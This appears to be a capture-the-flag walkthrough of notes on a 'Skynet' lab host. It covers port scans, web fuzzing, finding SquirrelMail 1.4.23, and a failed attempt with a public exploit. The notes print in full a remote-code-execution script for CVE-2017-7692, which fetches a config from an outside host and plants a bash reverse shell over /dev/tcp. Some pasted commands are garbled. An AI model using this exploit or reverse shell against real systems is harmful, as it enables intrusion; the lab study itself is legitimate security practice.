# 10.65.165.138

![](https://velog.velcdn.com/images/agnusdei1207/post/448e522f-cf65-4bc4-89a5-ef80eb7bcc50/image.png)


┌──(kali㉿kali)-[~]
└─$ sudo docker run --rm --name rustscan --net=host rustscan/rustscan -a 10.65.165.138
Unable to find image 'rustscan/rustscan:latest' locally
latest: Pulling from rustscan/rustscan
582df0bcf6ab: Pull complete 
c6a83fedfae6: Pull complete 
d9bd24e2554c: Pull complete 
Digest: sha256:1a0137749007f12880c7174c65e9f16835106a787ebc952118c2f9f4ff7a1309
Status: Downloaded newer image for rustscan/rustscan:latest
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: http://discord.skerritt.blog         :
: https://github.com/RustScan/RustScan :
 --------------------------------------
To scan or not to scan? That is the question.

[~] The config file is expected to be at "/home/rustscan/.rustscan.toml"
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
[!] Your file limit is very small, which negatively impacts RustScan's speed. Use the Docker image, or up the Ulimit with '--ulimit 5000'. 
Open 10.65.165.138:22
Open 10.65.165.138:80
Open 10.65.165.138:110
Open 10.65.165.138:143
Open 10.65.165.138:139
Open 10.65.165.138:445
[~] Starting Script(s)
[~] Starting Nmap 7.95 ( https://nmap.org ) at 2025-11-30 07:26 UTC
Initiating Ping Scan at 07:26
Scanning 10.65.165.138 [2 ports]
Completed Ping Scan at 07:26, 0.20s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 07:26
Completed Parallel DNS resolution of 1 host. at 07:26, 0.01s elapsed
DNS resolution of 1 IPs took 0.01s. Mode: Async [#: 2, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating Connect Scan at 07:26
Scanning 10.65.165.138 [6 ports]
Discovered open port 110/tcp on 10.65.165.138
Discovered open port 80/tcp on 10.65.165.138
Discovered open port 143/tcp on 10.65.165.138
Discovered open port 22/tcp on 10.65.165.138
Discovered open port 445/tcp on 10.65.165.138
Discovered open port 139/tcp on 10.65.165.138
Completed Connect Scan at 07:26, 0.20s elapsed (6 total ports)
Nmap scan report for 10.65.165.138
Host is up, received syn-ack (0.20s latency).
Scanned at 2025-11-30 07:26:47 UTC for 0s

PORT    STATE SERVICE      REASON
22/tcp  open  ssh          syn-ack
80/tcp  open  http         syn-ack
110/tcp open  pop3         syn-ack
139/tcp open  netbios-ssn  syn-ack
143/tcp open  imap         syn-ack
445/tcp open  microsoft-ds syn-ack

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 0.45 seconds

![](https://velog.velcdn.com/images/agnusdei1207/post/a44dd429-3679-488b-a28e-f09861cdff56/image.png)


──(kali㉿kali)-[~]
└─$ http http://10.65.165.138                    
HTTP/1.1 200 OK
Accept-Ranges: bytes
Connection: Keep-Alive
Content-Encoding: gzip
Content-Length: 289
Content-Type: text/html
Date: Sun, 30 Nov 2025 07:28:34 GMT
ETag: "20b-592bbec81c0b6-gzip"
Keep-Alive: timeout=5, max=100
Last-Modified: Tue, 17 Sep 2019 08:58:28 GMT
Server: Apache/2.4.18 (Ubuntu)
Vary: Accept-Encoding

<!DOCTYPE html>
<html>
        <head>
                <link rel="stylesheet" type="text/css" href="style.css">
                <link rel="shortcut icon" type="image/png" href="favicon.ico"/>
                <title>Skynet</title>
        </head>
        <body>
                <div>
                        <img src="image.png"/>
                        <form name="skynet" action="#" method="POST"><br>
                                <input type="search" class="search"><br>
                                <input type="submit" class="button" name="submit" value="Skynet Search">
                                <input type="submit" class="button" name="lucky" value="I'm Feeling Lucky">
                        </form>
                </div>
        </body>
</html>

22, 88, 110, 139, 143, 445

> path

ffuf -u http://10.65.165.138/FUZZ -w /usr/share/wordlists/seclists/Dicovery/Web-Content/common.txt

┌──(kali㉿kali)-[~]
└─$ sudo ffuf -u http://10.65.165.138/FUZZ -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://10.65.165.138/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

.hta                    [Status: 403, Size: 277, Words: 20, Lines: 10, Duration: 3298ms]
.htpasswd               [Status: 403, Size: 277, Words: 20, Lines: 10, Duration: 3298ms]
.htaccess               [Status: 403, Size: 277, Words: 20, Lines: 10, Duration: 4401ms]
admin                   [Status: 301, Size: 312, Words: 20, Lines: 10, Duration: 200ms]
config                  [Status: 301, Size: 313, Words: 20, Lines: 10, Duration: 303ms]
css                     [Status: 301, Size: 310, Words: 20, Lines: 10, Duration: 208ms]
index.html              [Status: 200, Size: 523, Words: 26, Lines: 19, Duration: 305ms]
js                      [Status: 301, Size: 309, Words: 20, Lines: 10, Duration: 309ms]
server-status           [Status: 403, Size: 277, Words: 20, Lines: 10, Duration: 213ms]
squirrelmail            [Status: 301, Size: 319, Words: 20, Lines: 10, Duration: 306ms]
:: Progress: [4746/4746] :: Job [1/1] :: 150 req/sec :: Duration: [0:00:36] :: Errors: 0 ::

> /admin

┌──(kali㉿kali)-[~]
└─$ sudo http http://10.65.165.138/admin/
HTTP/1.1 403 Forbidden
Connection: Keep-Alive
Content-Length: 277
Content-Type: text/html; charset=iso-8859-1
Date: Sun, 30 Nov 2025 07:42:26 GMT
Keep-Alive: timeout=5, max=100
Server: Apache/2.4.18 (Ubuntu)

<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>403 Forbidden</title>
</head><body>
<h1>Forbidden</h1>
<p>You don't have permission to access this resource.</p>
<hr>
<address>Apache/2.4.18 (Ubuntu) Server at 10.65.165.138 Port 80</address>
</body></html>


> squirrelmail
                                                                                                                          
┌──(kali㉿kali)-[~]
└─$ sudo http http://10.65.165.138/squirrelmail
HTTP/1.1 301 Moved Permanently
Connection: Keep-Alive
Content-Length: 319
Content-Type: text/html; charset=iso-8859-1
Date: Sun, 30 Nov 2025 07:43:34 GMT
Keep-Alive: timeout=5, max=100
Location: http://10.65.165.138/squirrelmail/
Server: Apache/2.4.18 (Ubuntu)

<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>301 Moved Permanently</title>
</head><body>
<h1>Moved Permanently</h1>
<p>The document has moved <a href="http://10.65.165.138/squirrelmail/">here</a>.</p>
<hr>
<address>Apache/2.4.18 (Ubuntu) Server at 10.65.165.138 Port 80</address>
</body></html>

![](https://velog.velcdn.com/images/agnusdei1207/post/7ffe0334-e834-4649-9191-1e219af9be1b/image.png)


```html
┌──(kali㉿kali)-[~]
└─$ curl -L http://10.65.165.138/squirrelmail
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">

<html>

<head>
<meta name="robots" content="noindex,nofollow">
<meta http-equiv="x-dns-prefetch-control" content="off">
<script type="text/javascript" language="JavaScript">
<!--
if (self != top) { try { if (document.domain != top.document.domain) { throw "Clickjacking security violation! Please log out immediately!"; /* this code should never execute - exception should already have been thrown since it's a security violation in this case to even try to access top.document.domain (but it's left here just to be extra safe) */ } } catch (e) { self.location = "/squirrelmail/src/signout.php"; top.location = "/squirrelmail/src/signout.php" } }
// -->
</script>

<title>SquirrelMail - Login</title><script language="JavaScript" type="text/javascript">
<!--
  var alreadyFocused = false;
  function squirrelmail_loginpage_onload() {
    document.login_form.js_autodetect_results.value = '1';
    if (alreadyFocused) return;
    var textElements = 0;
    for (i = 0; i < document.login_form.elements.length; i++) {
      if (document.login_form.elements[i].type == "text" || document.login_form.elements[i].type == "password") {
        textElements++;
        if (textElements == 1) {
          document.login_form.elements[i].focus();
          break;
        }
      }
    }
  }
// -->
</script>

<!--[if IE 6]>
<style type="text/css">
/* avoid stupid IE6 bug with frames and scrollbars */
body {
    width: expression(document.documentElement.clientWidth - 30);
}
</style>
<![endif]-->

</head>

<body text="#000000" bgcolor="#ffffff" link="#0000cc" vlink="#0000cc" alink="#0000cc" onLoad="squirrelmail_loginpage_onload();">
<form action="redirect.php" method="post" name="login_form"  >
<table bgcolor="#ffffff" border="0" cellspacing="0" cellpadding="0" width="100%"><tr><td align="center"><center><img src="../images/sm_logo.png" alt="SquirrelMail Logo" width="308" height="111" /><br />
<small>SquirrelMail version 1.4.23 [SVN]<br />
  By the SquirrelMail Project Team<br /></small>
<table bgcolor="#ffffff" border="0" width="350"><tr><td bgcolor="#dcdcdc" align="center"><b>SquirrelMail Login</b>
</td>
</tr>
<tr><td bgcolor="#ffffff" align="left">
<table bgcolor="#ffffff" align="center" border="0" width="100%"><tr><td align="right" width="30%">Name:</td>
<td align="left" width="70%"><input type="text" name="login_username" value="" onfocus="alreadyFocused=true;" />
</td>
</tr>

<tr><td align="right" width="30%">Password:</td>
<td align="left" width="70%"><input type="password" name="secretkey" onfocus="alreadyFocused=true;" />
<input type="hidden" name="js_autodetect_results" value="0" />
<input type="hidden" name="just_logged_in" value="1" />
</td>
</tr>
</table>
</td>
</tr>
<tr><td align="left"><center><input type="submit" value="Login" />
</center></td>
</tr>
</table>
</center></td>
</tr>
</table>
</form>
</body></html>

```


> SquirrelMail version 1.4.23


┌──(kali㉿kali)-[~]
└─$ sudo searchsploit SquirrelMail
-------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                              |  Path
-------------------------------------------------------------------------------------------- ---------------------------------
SquirrelMail - 'chpasswd' Local Buffer Overflow                                             | linux/local/273.c
SquirrelMail - 'chpasswd' Local Privilege Escalation (Brute Force)                          | linux/local/417.c
SquirrelMail 1.2.11 - 'move_messages.php' Arbitrary File Moving                             | php/webapps/22791.txt
SquirrelMail 1.2.11 - Multiple Vulnerabilities                                              | php/webapps/22793.txt
SquirrelMail 1.2.11 Administrator Plugin - 'options.php' Arbitrary Admin Account Creation   | php/webapps/22792.txt
SquirrelMail 1.2.6/1.2.7 - Multiple Cross-Site Scripting Vulnerabilities                    | php/webapps/21811.txt
SquirrelMail 1.2.x - From Email Header HTML Injection                                       | php/webapps/24167.txt
SquirrelMail 1.2.x - Theme Remote Command Execution                                         | php/webapps/21358.sh
SquirrelMail 1.4.2 Address Add Plugin - 'add.php' Cross-Site Scripting                      | php/webapps/26305.txt
Squirrelmail 1.4.x - 'Redirect.php' Local File Inclusion                                    | php/webapps/27948.txt
SquirrelMail 1.4.x - Folder Name Cross-Site Scripting                                       | php/webapps/24068.txt
SquirrelMail 1.x - Email Header HTML Injection                                              | linux/remote/24160.txt
SquirrelMail 3.1 - Change Passwd Plugin Local Buffer Overflow                               | linux/local/1449.c
SquirrelMail < 1.4.22 - Remote Code Execution                                               | linux/remote/41910.sh
SquirrelMail < 1.4.5-RC1 - Arbitrary Variable Overwrite                                     | php/webapps/43830.txt
SquirrelMail < 1.4.7 - Arbitrary Variable Overwrite                                         | php/webapps/43839.txt
SquirrelMail G/PGP Encryption Plugin - 'deletekey()' Command Injection                      | php/webapps/4718.rb
SquirrelMail G/PGP Encryption Plugin 2.0 - Command Execution                                | php/webapps/4173.txt
SquirrelMail G/PGP Encryption Plugin 2.0/2.1 - Access Validation / Input Validation         | php/webapps/30859.txt
SquirrelMail G/PGP Encryption Plugin 2.0/2.1 - Multiple Remote Command Execution Vulnerabil | php/webapps/30283.txt
SquirrelMail PGP Plugin - Command Execution (SMTP) (Metasploit)                             | linux/remote/16888.rb
SquirrelMail Virtual Keyboard Plugin - 'vkeyboard.php' Cross-Site Scripting                 | php/webapps/34814.txt
-------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
Papers: No Results

- 1.4.23 이니까 이중에서 될 가능성이 높아 보임

> Squirrelmail 1.4.x - 'Redirect.php' Local File Inclusion                                    | php/webapps/27948.txt
> SquirrelMail 1.4.x - Folder Name Cross-Site Scripting                                       | php/webapps/24068.txt
> SquirrelMail < 1.4.22 - Remote Code Execution                                               | linux/remote/41910.sh
> SquirrelMail < 1.4.5-RC1 - Arbitrary Variable Overwrite                                     | php/webapps/43830.txt 

┌──(kali㉿kali)-[~]
└─$ cat cat /usr/share/exploitdb/exploits/linux/remote/41910.sh 
```sh
#!/bin/bash
#
int='\033[94m
     __                     __   __  __           __
    / /   ___  ____ _____ _/ /  / / / /___ ______/ /_____  __________
   / /   / _ \/ __ `/ __ `/ /  / /_/ / __ `/ ___/ //_/ _ \/ ___/ ___/
  / /___/  __/ /_/ / /_/ / /  / __  / /_/ / /__/ ,< /  __/ /  (__  )
 /_____/\___/\__, /\__,_/_/  /_/ /_/\__,_/\___/_/|_|\___/_/  /____/
           /____/

SquirrelMail <= 1.4.23 Remote Code Execution PoC Exploit (CVE-2017-7692)

SquirrelMail_RCE_exploit.sh (ver. 1.1)

Discovered and coded by

Dawid Golunski (@dawid_golunski)
https://legalhackers.com

ExploitBox project:
https://ExploitBox.io

\033[0m'

# Quick and messy PoC for SquirrelMail webmail application.
# It contains payloads for 2 vectors:
# * File Write
# * RCE
# It requires user credentials and that SquirrelMail uses
# Sendmail method as email delivery transport
#
#
# Full advisory URL:
# https://legalhackers.com/advisories/SquirrelMail-Exploit-Remote-Code-Exec-CVE-2017-7692-Vuln.html
# Exploit URL:
# https://legalhackers.com/exploits/CVE-2017-7692/SquirrelMail_RCE_exploit.sh
#
# Tested on: # Ubuntu 16.04
# squirrelmail package version:
# 2:1.4.23~svn20120406-2ubuntu1.16.04.1
#
# Disclaimer:
# For testing purposes only
#
#
# -----------------------------------------------------------------
#
# Interested in vulns/exploitation?
# Stay tuned for my new project - ExploitBox
#
#                        .;lc'
#                    .,cdkkOOOko;.
#                 .,lxxkkkkOOOO000Ol'
#             .':oxxxxxkkkkOOOO0000KK0x:'
#          .;ldxxxxxxxxkxl,.'lk0000KKKXXXKd;.
#       ':oxxxxxxxxxxo;.       .:oOKKKXXXNNNNOl.
#      '';ldxxxxxdc,.              ,oOXXXNNNXd;,.
#     .ddc;,,:c;.         ,c:         .cxxc:;:ox:
#     .dxxxxo,     .,   ,kMMM0:.  .,     .lxxxxx:
#     .dxxxxxc     lW. oMMMMMMMK  d0     .xxxxxx:
#     .dxxxxxc     .0k.,KWMMMWNo :X:     .xxxxxx:
#     .dxxxxxc      .xN0xxxxxxxkXK,      .xxxxxx:
#     .dxxxxxc    lddOMMMMWd0MMMMKddd.   .xxxxxx:
#     .dxxxxxc      .cNMMMN.oMMMMx'      .xxxxxx:
#     .dxxxxxc     lKo;dNMN.oMM0;:Ok.    'xxxxxx:
#     .dxxxxxc    ;Mc   .lx.:o,    Kl    'xxxxxx:
#     .dxxxxxdl;. .,               .. .;cdxxxxxx:
#     .dxxxxxxxxxdc,.              'cdkkxxxxxxxx:
#      .':oxxxxxxxxxdl;.       .;lxkkkkkxxxxdc,.
#          .;ldxxxxxxxxxdc, .cxkkkkkkkkkxd:.
#             .':oxxxxxxxxx.ckkkkkkkkxl,.
#                 .,cdxxxxx.ckkkkkxc.
#                    .':odx.ckxl,.
#                        .,.'.
#
# https://ExploitBox.io
#
# https://twitter.com/Exploit_Box
#
# -----------------------------------------------------------------

sqspool="/var/spool/squirrelmail/attach/"

echo -e "$int"
#echo -e "\033[94m \nSquirrelMail - Remote Code Execution PoC Exploit (CVE-2017-7692) \n"
#echo -e "SquirrelMail_RCE_exploit.sh (ver. 1.0)\n"
#echo -e "Discovered and coded by: \n\nDawid Golunski \nhttps://legalhackers.com \033[0m\n\n"


# Base URL
if [ $# -ne 1 ]; then
        echo -e "Usage: \n$0 SquirrelMail_URL"
        echo -e "Example: \n$0 http://target/squirrelmail/ \n"

        exit 2
fi
URL="$1"

# Log in
echo -e "\n[*] Enter SquirrelMail user credentials"
read -p  "user: " squser
read -sp "pass: " sqpass

echo -e "\n\n[*] Logging in to SquirrelMail at $URL"
curl -s -D /tmp/sqdata -d"login_username=$squser&secretkey=$sqpass&js_autodetect_results=1&just_logged_in=1" $URL/src/redirect.php | grep -q incorrect
if [ $? -eq 0 ]; then
        echo "Invalid creds"
        exit 2
fi
sessid="`cat /tmp/sqdata | grep SQMSESS | tail -n1 | cut -d'=' -f2 | cut -d';' -f1`"
keyid="`cat /tmp/sqdata | grep key | tail -n1 | cut -d'=' -f2 | cut -d';' -f1`"


# Prepare Sendmail cnf
#
# * The config will launch php via the following stanza:
#
# Mlocal,       P=/usr/bin/php, F=lsDFMAw5:/|@qPn9S, S=EnvFromL/HdrFromL, R=EnvToL/HdrToL,
#               T=DNS/RFC822/X-Unix,
#               A=php -- $u $h ${client_addr}
#
wget -q -O/tmp/smcnf-exp https://legalhackers.com/exploits/sendmail-exploit.cf

# Upload config
echo -e "\n\n[*] Uploading Sendmail config"
token="`curl -s -b"SQMSESSID=$sessid; key=$keyid" "$URL/src/compose.php?mailbox=INBOX&startMessage=1" | grep smtoken | awk -F'value="' '{print $2}' | cut -d'"' -f1 `"
attachid="`curl -H "Expect:" -s -b"SQMSESSID=$sessid; key=$keyid" -F"smtoken=$token" -F"send_to=$mail" -F"subject=attach" -F"body=test" -F"attachfile=@/tmp/smcnf-exp" -F"username=$squser" -F"attach=Add" $URL/src/compose.php | awk -F's:32' '{print $2}' | awk -F'"' '{print $2}' | tr -d '\n'`"
if [ ${#attachid} -lt 32 ]; then
        echo "Something went wrong. Failed to upload the sendmail file."
        exit 2
fi

# Create Sendmail cmd string according to selected payload
echo -e "\n\n[?] Select payload\n"
# SELECT PAYLOAD
echo "1 - File write (into /tmp/sqpoc)"
echo "2 - Remote Code Execution (with the uploaded smcnf-exp + phpsh)"
echo
read -p "[1-2] " pchoice

case $pchoice in
        1) payload="$squser@localhost   -oQ/tmp/        -X/tmp/sqpoc"
           ;;

        2) payload="$squser@localhost   -oQ/tmp/        -C$sqspool/$attachid"
           ;;
esac

if [ $pchoice -eq 2 ]; then
        echo
        read -p "Reverese shell IP: " reverse_ip
        read -p "Reverese shell PORT: " reverse_port
fi

# Reverse shell code
phprevsh="
<?php
        \$cmd = \"/bin/bash -c 'bash -i >/dev/tcp/$reverse_ip/$reverse_port 0<&1 2>&1 & '\";
        file_put_contents(\"/tmp/cmd\", 'export PATH=\"\$PATH\" ; export TERM=vt100 ;' . \$cmd);
        system(\"/bin/bash /tmp/cmd ; rm -f /tmp/cmd\");
?>"


# Set sendmail params in user settings
echo -e "\n[*] Injecting Sendmail command parameters"
token="`curl -s -b"SQMSESSID=$sessid; key=$keyid" "$URL/src/options.php?optpage=personal" | grep smtoken | awk -F'value="' '{print $2}' | cut -d'"' -f1 `"
curl -s -b"SQMSESSID=$sessid; key=$keyid" -d "smtoken=$token&optpage=personal&optmode=submit&submit_personal=Submit" --data-urlencode "new_email_address=$payload" "$URL/src/options.php?optpage=personal" | grep -q 'Success' 2>/dev/null
if [ $? -ne 0 ]; then
        echo "Failed to inject sendmail parameters"
        exit 2
fi

# Send email which triggers the RCE vuln and runs phprevsh
echo -e "\n[*] Sending the email to trigger the vuln"
(sleep 2s && curl -s -D/tmp/sheaders -b"SQMSESSID=$sessid; key=$keyid" -d"smtoken=$token" -d"startMessage=1" -d"session=0" \
-d"send_to=$squser@localhost" -d"subject=poc" --data-urlencode "body=$phprevsh" -d"send=Send" -d"username=$squser" $URL/src/compose.php) &

if [ $pchoice -eq 2 ]; then
        echo -e "\n[*] Waiting for shell on $reverse_ip port $reverse_port"
        nc -vv -l -p $reverse_port
else
        echo -e "\n[*] The test file should have been written at /tmp/sqpoc"
fi

grep -q "302 Found" /tmp/sheaders
if [ $? -eq 1 ]; then
        echo "There was a problem with sending email"
        exit 2
fi


# Done
echo -e "\n[*] All done. Exiting"                                                                                                                      
```

> subdomain -> nothing

┌──(kali㉿kali)-[~]
└─$ sudosudo ffuf -up://10.65.165.138 -H "-H "Host: FUZZ.10.65.165.138" -osts.txt -w /-w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt


        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://10.65.165.138
 :: Wordlist         : FUZZ: /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt
 :: Header           : Host: FUZZ.10.65.165.138
 :: Output file      : vhosts.txt
 :: File format      : json
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________



>  /usr/share/exploitdb/exploits/linux/remote/41910.sh                                                                           

┌──(kali㉿kali)-[~]
└─$ sudosudo /usr/share/exploitdb/exploits/linux/remote/41910.sh 
[sudo] password for kali: 

     __                     __   __  __           __
    / /   ___  ____ _____ _/ /  / / / /___ ______/ /_____  __________
   / /   / _ \/ __ `/ __ `/ /  / /_/ / __ `/ ___/ //_/ _ \/ ___/ ___/
  / /___/  __/ /_/ / /_/ / /  / __  / /_/ / /__/ ,< /  __/ /  (__  )
 /_____/\___/\__, /\__,_/_/  /_/ /_/\__,_/\___/_/|_|\___/_/  /____/
           /____/

SquirrelMail <= 1.4.23 Remote Code Execution PoC Exploit (CVE-2017-7692)

SquirrelMail_RCE_exploit.sh (ver. 1.1)

Discovered and coded by

Dawid Golunski (@dawid_golunski)
https://legalhackers.com

ExploitBox project:
https://ExploitBox.io


Usage: 
/usr/share/exploitdb/exploits/linux/remote/41910.sh SquirrelMail_URL
Example: 
/usr/share/exploitdb/exploits/linux/remote/41910.sh http://target/squirrelmail/ 

                                                                                                                              
┌──(kali㉿kali)-[~]
└─$ sudo /usr/share/exploitdb/exploits/linux/remote/41910.sh http://10.65.165.138/squireelmail/

     __                     __   __  __           __
    / /   ___  ____ _____ _/ /  / / / /___ ______/ /_____  __________
   / /   / _ \/ __ `/ __ `/ /  / /_/ / __ `/ ___/ //_/ _ \/ ___/ ___/
  / /___/  __/ /_/ / /_/ / /  / __  / /_/ / /__/ ,< /  __/ /  (__  )
 /_____/\___/\__, /\__,_/_/  /_/ /_/\__,_/\___/_/|_|\___/_/  /____/
           /____/

SquirrelMail <= 1.4.23 Remote Code Execution PoC Exploit (CVE-2017-7692)

SquirrelMail_RCE_exploit.sh (ver. 1.1)

Discovered and coded by

Dawid Golunski (@dawid_golunski)
https://legalhackers.com

ExploitBox project:
https://ExploitBox.io



[*] Enter SquirrelMail user credentials
user: 
pass: 

[*] Logging in to SquirrelMail at http://10.65.165.138/squireelmail/


[*] Uploading Sendmail config
Something went wrong. Failed to upload the sendmail file.
                                                                                                                              
┌──(kali㉿kali)-[~]
└─$ clear     